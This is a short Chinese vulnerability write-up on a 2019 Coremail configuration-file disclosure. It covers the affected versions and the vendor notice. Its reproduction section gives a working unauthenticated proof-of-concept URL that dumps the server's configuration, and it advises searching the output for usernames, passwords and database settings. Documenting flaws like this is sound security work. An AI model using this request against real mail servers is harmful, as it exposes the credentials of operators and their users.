Coremail配置文件信息泄漏

一、漏洞简介

Coremail论客邮件系统开始研发于1999年，是中国第一套中文邮件系统，目前在中国大陆地区拥有超过10亿终端用户，是网易、中华网等运营商至今一直使用的邮件系统，也是政府、事业单位、科教、企业等机构广泛使用的邮件系统。
2019年6月，网上流传出Coremail论客邮件系统配置文件泄露的漏洞，该漏洞无需认证即可获取邮件系统的配置文件内容。
Coremail官网发布的漏洞公告：《关于Coremail邮件系统安全问题的情况说明》，http://www.coremail.cn/About/news_x/article_id/32641.htm

二、漏洞影响

Coremail XT 3.0.1至XT 5.0.9版本，XT 5.0.9a及以上版本已修复该漏洞

三、复现过程

POC
http://xx/mailsms/s?func=ADMIN:appState&dumpConfig=/
输入Poc访问漏洞页面
发现信息泄露页面内搜索user，password，database等关键字
